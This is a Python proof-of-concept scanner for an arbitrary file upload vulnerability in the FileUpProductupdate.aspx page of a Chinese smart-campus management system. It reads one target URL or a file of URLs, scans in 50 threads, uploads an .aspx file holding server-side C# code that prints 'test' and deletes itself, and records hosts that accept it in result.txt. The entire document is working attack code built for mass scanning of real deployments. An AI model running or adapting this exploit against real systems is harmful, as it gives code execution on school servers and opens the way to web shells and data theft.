# 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
 █████╗ ███╗   ██╗██╗  ██╗██╗ █████╗  ██████╗ ██╗   ██╗██╗
██╔══██╗████╗  ██║╚██╗██╔╝██║██╔══██╗██╔═══██╗╚██╗ ██╔╝██║
███████║██╔██╗ ██║ ╚███╔╝ ██║███████║██║   ██║ ╚████╔╝ ██║
██╔══██║██║╚██╗██║ ██╔██╗ ██║██╔══██║██║   ██║  ╚██╔╝  ██║
██║  ██║██║ ╚████║██╔╝ ██╗██║██║  ██║╚██████╔╝   ██║   ██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝                                                         

"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/Module/FileUpPage/FileUpProductupdate.aspx'
    url = target+payload
    headers = {"User-Agent": "ozilla/4.0(compatible; MSIE 7.0;Windows NT 5.1;Trident/4.0; SV1;QQDownload732;.NET4.0C;.NET4.0E; SE 2.XMetaSr1.0)", "Content-Type": "multipart/form-data; boundary=---***", "X-Requested-With": "MLHttpRequest", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    data = "-----***\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.aspx\"\r\nContent-Type: image/jpeg\r\n\r\n<%@PageLanguage=\"C#\"%><%Response.Write(\"test\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n-----***--"
    #请求网页
    # 上传后的url：/Upload/Publish/000000/0_0_0_0/update.aspx
    try:
        re = requests.get(url=target,verify=False)
        if re.status_code == 200 : 
            res1 = requests.post(url=url,headers=headers,data=data,verify=False)
            if res1.status_code == 200 and 'saveName' in res1.text:   
                print(f'[+++]该{target}存在漏洞')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
            else:
                print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()